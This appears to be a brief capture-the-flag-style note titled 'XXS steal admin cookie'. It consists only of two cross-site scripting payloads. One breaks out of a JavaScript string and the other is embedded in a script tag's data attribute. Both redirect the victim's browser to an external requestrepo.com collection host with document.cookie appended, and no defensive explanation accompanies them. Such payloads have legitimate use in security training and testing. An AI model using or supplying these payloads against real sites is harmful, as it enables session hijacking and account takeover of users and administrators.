## XXS steal admin cookie

### payload
```javascript
a');document.location="http://f5kkqikm.requestrepo.com?c="+document.cookie;//
```

```javascript
<script id='debug' src='/static/js/thing.js' data-ilovemass="a');document.location='http://f5kkqikm.requestrepo.com?c='+document.cookie;//"></script>
```